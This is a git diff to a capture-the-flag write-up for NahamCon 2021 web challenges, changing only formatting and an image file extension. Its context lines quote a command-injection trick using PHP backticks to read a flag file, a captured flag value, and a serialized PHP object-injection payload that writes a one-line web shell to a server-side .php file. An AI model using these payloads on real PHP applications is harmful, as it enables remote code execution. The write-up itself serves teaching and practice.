@@ -93,8 +93,8 @@ else
 } ?>
 ```
 
-The attack is still posibble by using backtick as the alias for `shell_Exec` in php, and we can get the flag by using this payload `<../flag.txt` the flag `flag{1beadaf44586ea4aba2ea9a00c5b6d91}
-`
+The attack is still posibble by using backtick as the alias for `shell_Exec` in php, and we can get the flag by using this payload `<../flag.txt` the flag `flag{1beadaf44586ea4aba2ea9a00c5b6d91}`
+
 ---
 # [Medium] Imposter - 492 points (71 Solves)
 
@@ -201,7 +201,7 @@ class log
 
 by reading the code we understand that our input is unserialized by the application, and we just control the log filename`($logs)` we want and the content`($request)` by using this serialize payload below:
 
-![../images/nahamcon21/php-doctor.png](../images/nahamcon21/php-doctor.png)
+![../images/nahamcon21/php-doctor.jpg](../images/nahamcon21/php-doctor.jpg)
 
 ```
 O:3:"log":4:{s:4:"logs";s:16:"yerabajigur5.php";s:7:"request";s:28:"<?php $_GET[1]($_GET[2]); ?>";s:6:"cereal";s:5:"XXXXX";s:4:"milk";s:2:"AA"}
